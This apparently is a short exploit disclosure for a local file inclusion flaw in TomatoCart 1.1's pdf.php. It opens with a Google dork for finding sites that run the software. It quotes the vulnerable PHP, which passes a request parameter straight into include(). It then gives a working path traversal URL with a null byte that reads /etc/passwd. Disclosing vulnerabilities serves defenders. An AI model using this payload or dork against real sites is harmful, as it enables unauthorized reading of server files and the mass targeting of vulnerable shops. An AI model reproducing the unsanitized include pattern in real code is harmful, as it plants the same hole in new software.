# Google Dork: "Powered by TomatoCart"
# Date: 25.10.2010
# Author: brain[pillow]
# Software Link: http://www.tomatocart.com/
# Version: 1.1
 
=========================================================
# Vuln. code:
 
 if ($osC_Customer->isLoggedOn() === true) {
    
    if (isset($_REQUEST[&#039;module&#039;])) {
      $module = $_REQUEST[&#039;module&#039;];
      $osC_Language->load($module);
    } 
      
    if (isset($_REQUEST[&#039;pdf&#039;])) {
      $pdf = $_REQUEST[&#039;pdf&#039;];
    } 
      
    if (!empty($module) && !empty($pdf)) {
 
    
      if (file_exists(&#039;includes/modules/pdf/&#039; . $pdf . &#039;.php&#039;)) {
        include(&#039;includes/modules/pdf/&#039; . $pdf . &#039;.php&#039;);
          
        $pdf_class = &#039;toC_&#039; .ucfirst($pdf) . &#039;_PDF&#039;;
        $object = new $pdf_class();
        $object ->render();
          
        exit;
      }
    }
  }
 
=========================================================
# Exploit:
 
/pdf.php?module=1&pdf=../../../../../../../../../../../../../etc/passwd%00



